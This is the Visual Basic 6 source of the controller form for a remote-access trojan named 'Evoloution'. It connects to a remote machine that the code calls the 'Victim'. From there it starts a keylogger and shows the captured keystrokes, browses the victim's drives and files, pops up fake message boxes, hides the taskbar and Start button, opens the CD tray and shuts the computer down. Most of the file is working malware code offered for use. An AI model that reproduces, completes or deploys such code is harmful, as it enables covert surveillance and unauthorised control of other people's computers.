VERSION 5.00
Object = "{831FDD16-0C5C-11D2-A9FC-0000F8754DA1}#2.0#0"; "MSCOMCT3N.OCX"
Object = "{248DD890-BB45-11CF-9ABC-0080C7E7B78D}#1.0#0"; "MSWINSCN.OCX"
Object = "{BDC217C8-ED16-11CD-956C-0000C04E4C0A}#1.1#0"; "TABCTL3N.OCX"
Begin VB.Form frmClient 
   BorderStyle     =   1  'Fixed Single
   Caption         =   "Evoloution - A New Way to Feer"
   ClientHeight    =   4995
   ClientLeft      =   150
   ClientTop       =   435
   ClientWidth     =   7800
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   4995
   ScaleWidth      =   7800
   StartUpPosition =   2  'CenterScreen
   Begin MSComctlLib.StatusBar StatusBar1 
      Align           =   2  'Align Bottom
      Height          =   375
      Left            =   0
      TabIndex        =   1
      Top             =   4620
      Width           =   7800
      _ExtentX        =   13758
      _ExtentY        =   661
      Style           =   1
      SimpleText      =   "Idle"
      _Version        =   393216
      BeginProperty Panels {8E3867A5-8586-11D1-B16A-00C0F0283628} 
         NumPanels       =   1
         BeginProperty Panel1 {8E3867AB-8586-11D1-B16A-00C0F0283628} 
         EndProperty
      EndProperty
   End
   Begin VB.Timer Timcheck 
      Enabled         =   0   'False
      Interval        =   3000
      Left            =   1200
      Top             =   3960
   End
   Begin VB.Timer timDisconnect 
      Enabled         =   0   'False
      Interval        =   1500
      Left            =   1200
      Top             =   3600
   End
   Begin TabDlg.SSTab SSTab1 
      Height          =   4575
      Left            =   0
      TabIndex        =   0
      Top             =   0
      Width           =   7815
      _ExtentX        =   13785
      _ExtentY        =   8070
      _Version        =   393216
      TabHeight       =   520
      Enabled         =   0   'False
      TabCaption(0)   =   "Fun and Games"
      TabPicture(0)   =   "frmClient.frx":0000
      Tab(0).ControlEnabled=   -1  'True
      Tab(0).Control(0)=   "Client"
      Tab(0).Control(0).Enabled=   0   'False
      Tab(0).Control(1)=   "Frame1"
      Tab(0).Control(1).Enabled=   0   'False
      Tab(0).Control(2)=   "Frame2"
      Tab(0).Control(2).Enabled=   0   'False
      Tab(0).ControlCount=   3
      TabCaption(1)   =   "Keyboard And Chat"
      TabPicture(1)   =   "frmClient.frx":001C
      Tab(1).ControlEnabled=   0   'False
      Tab(1).Control(0)=   "Frame3"
      Tab(1).Control(0).Enabled=   0   'False
      Tab(1).Control(1)=   "Frame4"
      Tab(1).Control(1).Enabled=   0   'False
      Tab(1).ControlCount=   2
      TabCaption(2)   =   "File Minipulation"
      TabPicture(2)   =   "frmClient.frx":0038
      Tab(2).ControlEnabled=   0   'False
      Tab(2).Control(0)=   "FrameDrv"
      Tab(2).Control(0).Enabled=   0   'False
      Tab(2).Control(1)=   "FrameDir"
      Tab(2).Control(1).Enabled=   0   'False
      Tab(2).Control(2)=   "FrameFiles"
      Tab(2).Control(2).Enabled=   0   'False
      Tab(2).Control(3)=   "Winsock1"
      Tab(2).Control(3).Enabled=   0   'False
      Tab(2).Control(4)=   "Timer1"
      Tab(2).Control(4).Enabled=   0   'False
      Tab(2).Control(5)=   "cmdOpenDir"
      Tab(2).Control(5).Enabled=   0   'False
      Tab(2).Control(6)=   "Command1"
      Tab(2).Control(6).Enabled=   0   'False
      Tab(2).Control(7)=   "cmdDel"
      Tab(2).Control(7).Enabled=   0   'False
      Tab(2).Control(8)=   "cmdGet"
      Tab(2).Control(8).Enabled=   0   'False
      Tab(2).ControlCount=   9
      Begin VB.CommandButton cmdGet 
         Caption         =   "Download File"
         Height          =   375
         Left            =   -74880
         TabIndex        =   41
         Top             =   2760
         Width           =   1455
      End
      Begin VB.CommandButton cmdDel 
         Caption         =   "Delete File"
         CausesValidation=   0   'False
         Height          =   375
         Left            =   -74880
         TabIndex        =   40
         Top             =   2400
         Width           =   1455
      End
      Begin VB.CommandButton Command1 
         Caption         =   "Up to Next Level"
         Height          =   375
         Left            =   -74880
         TabIndex        =   39
         Top             =   2040
         Width           =   1455
      End
      Begin VB.CommandButton cmdOpenDir 
         Caption         =   "Open Directory"
         Height          =   375
         Left            =   -74880
         TabIndex        =   38
         Top             =   1680
         Width           =   1455
      End
      Begin VB.Timer Timer1 
         Enabled         =   0   'False
         Interval        =   2
         Left            =   -74280
         Top             =   3000
      End
      Begin MSWinsockLib.Winsock Winsock1 
         Left            =   -74280
         Top             =   2280
         _ExtentX        =   741
         _ExtentY        =   741
         _Version        =   393216
         RemotePort      =   3456
      End
      Begin VB.Frame FrameFiles 
         Caption         =   "Files"
         Height          =   1815
         Left            =   -73320
         TabIndex        =   35
         Top             =   2640
         Width           =   6015
         Begin VB.ListBox lstFiles 
            Height          =   1425
            Left            =   120
            TabIndex        =   37
            Top             =   240
            Width           =   5775
         End
      End
      Begin VB.Frame FrameDir 
         Caption         =   "Directorys"
         Height          =   2175
         Left            =   -73320
         TabIndex        =   34
         Top             =   480
         Width           =   6015
         Begin VB.ListBox lstDir 
            Height          =   1815
            Left            =   120
            TabIndex        =   36
            Top             =   240
            Width           =   5775
         End
      End
      Begin VB.Frame FrameDrv 
         Caption         =   "Drives"
         Height          =   1095
         Left            =   -74880
         TabIndex        =   32
         Top             =   480
         Width           =   1455
         Begin VB.ListBox lstDrives 
            Height          =   645
            Left            =   120
            TabIndex        =   33
            Top             =   240
            Width           =   1215
         End
      End
      Begin VB.Frame Frame4 
         Caption         =   "Chat"
         BeginProperty Font 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   3975
         Left            =   -71520
         TabIndex        =   27
         Top             =   480
         Width           =   4215
         Begin MSWinsockLib.Winsock chat 
            Left            =   480
            Top             =   240
            _ExtentX        =   741
            _ExtentY        =   741
            _Version        =   393216
            LocalPort       =   27374
         End
         Begin VB.CommandButton cmdOpenChat 
            Caption         =   "Open Chat"
            Height          =   315
            Left            =   120
            TabIndex        =   31
            Top             =   240
            Width           =   3975
         End
         Begin VB.CommandButton cmdChat 
            Caption         =   "Send"
            Enabled         =   0   'False
            Height          =   375
            Left            =   3240
            TabIndex        =   30
            Top             =   3480
            Width           =   855
         End
         Begin VB.TextBox txtSend 
            Enabled         =   0   'False
            Height          =   405
            Left            =   120
            TabIndex        =   29
            Top             =   3480
            Width           =   3015
         End
         Begin VB.TextBox txtDisplay 
            Enabled         =   0   'False
            Height          =   2775
            Left            =   120
            MultiLine       =   -1  'True
            ScrollBars      =   2  'Vertical
            TabIndex        =   28
            Top             =   600
            Width           =   3975
         End
      End
      Begin VB.Frame Frame3 
         Caption         =   "Key Logger"
         BeginProperty Font 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   3975
         Left            =   -74760
         TabIndex        =   23
         Top             =   480
         Width           =   3135
         Begin VB.CommandButton cmdStartKeyLogger 
            Caption         =   "Start Key Logger"
            Height          =   375
            Left            =   120
            TabIndex        =   26
            Top             =   360
            Width           =   1455
         End
         Begin VB.CommandButton cmdStopKeyLogger 
            Caption         =   "Stop Key Logger"
            Enabled         =   0   'False
            Height          =   375
            Left            =   1560
            TabIndex        =   25
            Top             =   360
            Width           =   1455
         End
         Begin VB.TextBox Text1 
            Height          =   3015
            Left            =   120
            MultiLine       =   -1  'True
            ScrollBars      =   2  'Vertical
            TabIndex        =   24
            Top             =   840
            Width           =   2895
         End
      End
      Begin VB.Frame Frame2 
         Caption         =   "Message Box Functions"
         BeginProperty Font 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   3495
         Left            =   2520
         TabIndex        =   10
         Top             =   480
         Width           =   5175
         Begin VB.CheckBox Check1 
            Caption         =   "Exclamation"
            BeginProperty Font 
               Name            =   "MS Sans Serif"
               Size            =   8.25
               Charset         =   0
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Height          =   495
            Left            =   1080
            TabIndex        =   22
            Top             =   1440
            Width           =   1455
         End
         Begin VB.CheckBox Check2 
            Caption         =   "Infomation"
            BeginProperty Font 
               Name            =   "MS Sans Serif"
               Size            =   8.25
               Charset         =   0
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Height          =   495
            Left            =   1080
            TabIndex        =   21
            Top             =   2160
            Width           =   1215
         End
         Begin VB.CheckBox Check3 
            Caption         =   "Warning"
            BeginProperty Font 
               Name            =   "MS Sans Serif"
               Size            =   8.25
               Charset         =   0
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Height          =   495
            Left            =   1080
            TabIndex        =   20
            Top             =   2880
            Width           =   1215
         End
         Begin VB.CommandButton cmdMessage 
            Caption         =   "Send Message"
            Height          =   375
            Left            =   3240
            TabIndex        =   18
            Top             =   960
            Width           =   1335
         End
         Begin VB.CommandButton cmdClear 
            Caption         =   "Clear"
            Height          =   375
            Left            =   3240
            TabIndex        =   17
            Top             =   1320
            Width           =   1335
         End
         Begin VB.PictureBox Picture3 
            Appearance      =   0  'Flat
            BackColor       =   &H8000000A&
            BorderStyle     =   0  'None
            ForeColor       =   &H80000008&
            Height          =   495
            Left            =   480
            Picture         =   "frmClient.frx":0054
            ScaleHeight     =   495
            ScaleWidth      =   495
            TabIndex        =   15
            Top             =   2880
            Width           =   495
         End
         Begin VB.PictureBox Picture2 
            Appearance      =   0  'Flat
            BackColor       =   &H8000000A&
            BorderStyle     =   0  'None
            ForeColor       =   &H80000008&
            Height          =   495
            Left            =   480
            Picture         =   "frmClient.frx":0496
            ScaleHeight     =   495
            ScaleWidth      =   495
            TabIndex        =   14
            Top             =   2160
            Width           =   495
         End
         Begin VB.PictureBox Picture1 
            Appearance      =   0  'Flat
            BackColor       =   &H8000000A&
            BorderStyle     =   0  'None
            ForeColor       =   &H80000008&
            Height          =   615
            Left            =   480
            Picture         =   "frmClient.frx":08D8
            ScaleHeight     =   615
            ScaleWidth      =   495
            TabIndex        =   13
            Top             =   1440
            Width           =   495
         End
         Begin VB.TextBox txtMessage 
            Alignment       =   2  'Center
            Height          =   375
            Left            =   120
            TabIndex        =   12
            Top             =   480
            Width           =   4935
         End
         Begin VB.Label Label3 
            Alignment       =   2  'Center
            Caption         =   $"frmClient.frx":0D1A
            BeginProperty Font 
               Name            =   "MS Sans Serif"
               Size            =   8.25
               Charset         =   0
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Height          =   1575
            Left            =   2760
            TabIndex        =   19
            Top             =   1800
            Width           =   2295
         End
         Begin VB.Line Line1 
            X1              =   2640
            X2              =   2640
            Y1              =   3360
            Y2              =   1080
         End
         Begin VB.Label Label2 
            Alignment       =   2  'Center
            Caption         =   "Select the Button Type"
            BeginProperty Font 
               Name            =   "MS Sans Serif"
               Size            =   8.25
               Charset         =   0
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Height          =   495
            Left            =   120
            TabIndex        =   16
            Top             =   960
            Width           =   1215
         End
         Begin VB.Label Label1 
            Alignment       =   2  'Center
            Caption         =   "Enter the Message you Wish the send to the server"
            Height          =   375
            Left            =   120
            TabIndex        =   11
            Top             =   240
            Width           =   4935
         End
      End
      Begin VB.Frame Frame1 
         Caption         =   "Annoying Tools"
         BeginProperty Font 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   3495
         Left            =   120
         TabIndex        =   2
         Top             =   480
         Width           =   2295
         Begin VB.CommandButton cmdOpenCD 
            Caption         =   "Open Cd Tray"
            Height          =   375
            Left            =   240
            TabIndex        =   9
            Top             =   360
            Width           =   1815
         End
         Begin VB.CommandButton cmdCloseCD 
            Caption         =   "Close CD Tray"
            Height          =   375
            Left            =   240
            TabIndex        =   8
            Top             =   720
            Width           =   1815
         End
         Begin VB.CommandButton cmdHide 
            Caption         =   "Hide the Task Bar"
            Height          =   375
            Left            =   240
            TabIndex        =   7
            Top             =   1200
            Width           =   1815
         End
         Begin VB.CommandButton cmdShow 
            Caption         =   "Show the Task Bar"
            Height          =   375
            Left            =   240
            TabIndex        =   6
            Top             =   1560
            Width           =   1815
         End
         Begin VB.CommandButton cmdShutDown 
            Caption         =   "Shutdown Computer"
            Height          =   375
            Left            =   240
            TabIndex        =   5
            Top             =   2880
            Width           =   1815
         End
         Begin VB.CommandButton cmdDisableStart 
            Caption         =   "Disable Start Button"
            Height          =   375
            Left            =   240
            TabIndex        =   4
            Top             =   2040
            Width           =   1815
         End
         Begin VB.CommandButton cmdEnableStart 
            Caption         =   "Enable Start button"
            Height          =   375
            Left            =   240
            TabIndex        =   3
            Top             =   2400
            Width           =   1815
         End
      End
      Begin MSWinsockLib.Winsock Client 
         Left            =   7200
         Top             =   0
         _ExtentX        =   741
         _ExtentY        =   741
         _Version        =   393216
         RemotePort      =   2000
      End
   End
   Begin VB.Menu mnuConnection 
      Caption         =   "Connection"
      Begin VB.Menu mnuConnect 
         Caption         =   "Connect"
      End
      Begin VB.Menu mnuDisconnect 
         Caption         =   "Disconnect"
      End
   End
End
Attribute VB_Name = "frmClient"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False

Private Sub chat_ConnectionRequest(ByVal requestID As Long)
    If chat.State <> sckConnected Then
        Call chat.Close
    End If
    Call chat.Accept(requestID)
    
End Sub

Private Sub chat_DataArrival(ByVal bytesTotal As Long)
    Dim inchat As String
    Call chat.GetData(inchat)
    txtDisplay.Text = txtDisplay.Text & "Victim: " & inchat & vbCrLf
    txtDisplay.SelLength = Len(txtDisplay.Text)
    Beep
End Sub

Private Sub chat_Error(ByVal Number As Integer, Description As String, ByVal Scode As Long, ByVal Source As String, ByVal HelpFile As String, ByVal HelpContext As Long, CancelDisplay As Boolean)
chat.Close

End Sub

Private Sub Check1_Click()
    ' if this check box is clicked then the other two should
    ' be deselected
    Check2.Value = 0
    Check3.Value = 0
    '
End Sub

Private Sub Check2_Click()
    ' if this check box is clicked then the other two should
    ' be deselected
    Check1.Value = 0
    Check3.Value = 0
   '
End Sub

Private Sub Check3_Click()
    ' if this check box is clicked then the other two should
    ' be deselected
    Check1.Value = 0
    Check2.Value = 0
    '
End Sub

Private Sub Client_DataArrival(ByVal bytesTotal As Long)
Dim Incomming As String
    Call Client.GetData(Incomming)
    
    Text1.Text = Text1.Text & Incomming
    
End Sub



Private Sub cmdChat_Click()
    Dim ChatText As String
    ChatText = txtSend.Text
    Call chat.SendData(ChatText)
    txtDisplay.Text = txtDisplay.Text & "You Say: " & txtSend.Text & vbCrLf
    txtSend.Text = ""
    txtDisplay.SelStart = Len(txtDisplay.Text)
    Beep
End Sub

Private Sub cmdClear_Click()
    ' Clear all The Message Box Feilds
    Check1.Value = 0
    Check2.Value = 0
    Check3.Value = 0
    txtMessage.Text = "Enter Your Message Here"
    '
End Sub

Private Sub cmdCloseCD_Click()
    ' Send the server the command to close the cd tray
    Call Client.SendData("Close-CD")
    '
End Sub

Private Sub cmdDisableStart_Click()
    ' Send the server the command to
    ' disable the start button
    Call Client.SendData("Hide-Start")
End Sub

Private Sub cmdEnableStart_Click()
    ' Send the server the command to
    ' enable the start button
    Call Client.SendData("Show-Start")
End Sub

Private Sub cmdHide_Click()
    ' Send the server the command to hide the task bar
    Call Client.SendData("Hide-Bar")
End Sub

Private Sub cmdMessage_Click()
    ' Check that at least one of the Check Boxes has been enabled
     If Check1.Value = 0 And Check2.Value = 0 And Check3.Value = 0 Then
        MsgBox "You must select the type of message you wish to send" & vbCrLf & "to the user, by selecting one from the panel", 16, "Input Error"
        Exit Sub
    End If
    '
    ' Check the user has entered text to send as a message
    If txtMessage.Text = "" Then
        MsgBox "You must enter the message text you wish to send to the victim", 16, "Input Error"
        Call cmdClear_Click
        Exit Sub
    End If
    ' If the check box is checked then send the message type
    ' and the message to the server
    If Check1.Value = 1 Then
        Call Client.SendData("Excla" & txtMessage.Text)
    End If
    If Check2.Value = 1 Then
        Call Client.SendData("infor" & txtMessage.Text)
    End If
    If Check3.Value = 1 Then
        Call Client.SendData("warn." & txtMessage.Text)
    End If
    
End Sub

Private Sub cmdOpenCD_Click()
    ' Send the server the command to close the cd tray
    Call Client.SendData("Open-CD")
    '
End Sub



Private Sub cmdOpenChat_Click()
    If cmdOpenChat.Caption = "Close Chat" Then
        Call Client.SendData("CC")
        Call chat.Close
        txtDisplay.Enabled = False
        txtSend.Enabled = False
        cmdChat.Enabled = False
        txtSend.Text = ""
        txtDisplay.Text = ""
        cmdOpenChat.Caption = "Open Chat"
        Exit Sub
    End If
    
    txtSend.Enabled = True
    txtDisplay.Enabled = True
    cmdChat.Enabled = True
    ' Tell the server to prepare for a chat
     Call Client.SendData("chat")
     ' Change the button Caption
     cmdOpenChat.Caption = "Close Chat"
     Call chat.Listen
End Sub

Private Sub cmdShow_Click()
    ' Send the server the command to Show the task bar
    Call Client.SendData("Show-Bar")
End Sub

Private Sub cmdShutDown_Click()
    ' Send the server the command to reboot
    ' the remote system, you will loose connection
    ' At this point
    Call Client.SendData("Shut-Down")
End Sub

Private Sub cmdStartKeyLogger_Click()
    Call Client.SendData("keylog")
    cmdStartKeyLogger.Enabled = False
    cmdStopKeyLogger.Enabled = True
    
    
End Sub

Private Sub cmdStopKeylogger_Click()
    cmdStartKeyLogger.Enabled = True
    cmdStopKeyLogger.Enabled = False
    Call Client.SendData("stopkeylog")
    
End Sub



Private Sub Form_Load()
    ' We diable the mnuDisconnect Item to avoid generating
    ' runtime errors
    mnuDisconnect.Enabled = False
    '
End Sub

Private Sub mnuConnect_Click()
    ' Get the information of the remote host from the user
    IPAddress = InputBox("Please enter the IP address of the remote host you wish to connect to.", "User Input", "127.0.0.1")
    '
    ' Check the user entered a valid value
    If IPAddress = "" Then
        MsgBox "You must enter a host for the client to connect to", 16, "Error"
        Exit Sub ' Exit the current Sub
    End If
    '
    ' Instruct the socket to connect to the host specifies, on the
    ' port defined under the socket Properties
    Call Client.Connect(IPAddress)
    '
    ' We now disable the mnuconnect item to avoide runtime errors
    mnuConnect.Enabled = False
    '
    ' And we enable the mnudisconnect item
    mnuDisconnect.Enabled = True
    '
    ' We enable the connection timer to check the
    ' state of the connection every second
    Timcheck.Enabled = True
    '
    ' Change the caption on the stsus bar
    StatusBar1.SimpleText = "Connecting to " & IPAddress & " " & Now
    '
    Call Winsock1.Connect(IPAddress)
End Sub

Private Sub mnuDisconnect_Click()
    ' Here we insert a ift/then/else statement to check if the socket is
    ' connected and if so to send the disconnect command and enable the
    ' Disconnect timer.
    '
    ' If the socket is not connected however, We display a message box to the user
    ' And close the socket to avoid runtime errors
    If Client.State = sckConnected Then
        '
        ' We need to send the server a message telling it to shut down and to
        ' listen on the defined port
        Call Client.SendData("Disconnect")
        '
        ' We now enable the disconnect timer to could 1.5 seconds to make sure
        ' that the server will have recived the message that we plan to Disconnect
        timDisconnect.Enabled = True
        '
    Else
        MsgBox "You Are not Connected", 16, "Error"
        Call Client.Close
    End If
    '
    ' We disable the mnudisconnect item to avoid runtime errors
    mnuDisconnect.Enabled = False
    '
    ' And we enable the mnuConnect item to enable us to connect to
    ' Another host if we wish
    mnuConnect.Enabled = True
    '
    ' Disable the tabbed control
    SSTab1.Enabled = False
    '
End Sub




Private Sub Text1_Change()
    Text1.SelLength = Len(Text1.Text)
End Sub

Private Sub Timcheck_Timer()
    ' Use this timer to check the state of the connection every
    ' 1 second
    ' If the connection is lost, the Client Socket will be closed
    ' And this timer disabled, Also a message will be displayed to the user
    If Client.State <> sckConnected Then
        Call Client.Close
        MsgBox "You were disconnected from the remote host or the host is no longer available", 16, "Error"
        Timcheck.Enabled = False
        ' Disable the tabbed control
        SSTab1.Enabled = False
        '
        ' Display a message in the status bar
        StatusBar1.SimpleText = "Disconnected"
        ' We disable the mnudisconnect item to avoid runtime errors
        mnuDisconnect.Enabled = False
        '
        ' And we enable the mnuConnect item to enable us to connect to
        ' Another host if we wish
        mnuConnect.Enabled = True
        '
        Exit Sub
    End If
    StatusBar1.SimpleText = "Connected" & " " & Now
    ' IF a connection is esablised then enable the tab control
    If Client.State = sckConnected Then
        SSTab1.Enabled = True
    End If
    '
End Sub

Private Sub timDisconnect_Timer()
    ' When the Disconnect timer has counter 1.5 seconds, we can close our local
    ' socket to enable us to connect to another host
    Client.Close
    '
    ' We now disable the Disconnect timer
    timDisconnect.Enabled = False
    '
End Sub


Private Sub txtMessage_GotFocus()
    ' When the text box for the message text recives focus
    ' clear it
    txtMessage.Text = ""
End Sub


Private Sub txtSend_KeyPress(KeyAscii As Integer)
    If KeyAscii = vbKeyReturn Then
        KeyAscii = 0
        Call cmdChat_Click
    End If
    
End Sub
Private Sub cmdOpenDir_Click()
Call Winsock1.SendData("Dir" & lstDir.List(lstDir.ListIndex))
End Sub

Private Sub Command1_Click()
    Call Winsock1.SendData("up.")
End Sub

Private Sub lstDir_Click()
    Call cmdOpenDir_Click
End Sub

Private Sub lstDrives_Click()
    Drive = lstDrives.List(lstDrives.ListIndex)
    Call Winsock1.SendData("Drv" & Drive)
    
    
End Sub

Private Sub Timer1_Timer()
lstDir.AddItem "."
Timer1.Enabled = False
End Sub

Private Sub Winsock1_ConnectionRequest(ByVal requestID As Long)
Winsock1.Close
Winsock1.Accept (requestID)
Debug.Print Winsock1.State

End Sub

Private Sub Winsock1_DataArrival(ByVal bytesTotal As Long)
Dim data As String
If data = "." Then
    lstDir.AddItem (data)
End If

Call Winsock1.GetData(data)
Select Case Left(data, 1)
Case 1
    
    lstDrives.AddItem Mid(data, 2)
Case 2
    lstDir.AddItem Mid(data, 2)
Case 3
    lstFiles.AddItem Mid(data, 2)
Case 4
    lstDrives.Clear
    lstFiles.Clear
    lstDir.Clear
Case 5
MsgBox "You Are At the Top of the directory Tree", 16, "Top Level Reached"
End Select

End Sub

